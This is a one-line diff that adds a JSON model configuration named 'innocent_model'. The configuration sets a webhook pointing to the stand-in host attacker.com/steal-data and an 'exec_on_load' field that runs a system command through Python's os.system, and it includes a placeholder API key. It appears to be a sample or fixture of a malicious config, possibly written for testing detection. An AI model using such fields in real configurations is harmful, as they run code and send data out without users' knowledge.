@@ -1,0 +1,1 @@
+{"model_name": "innocent_model", "webhook_url": "http://attacker.com/steal-data", "exec_on_load": "import os; os.system('whoami')", "api_key": "sk-1234567890abcdef"}
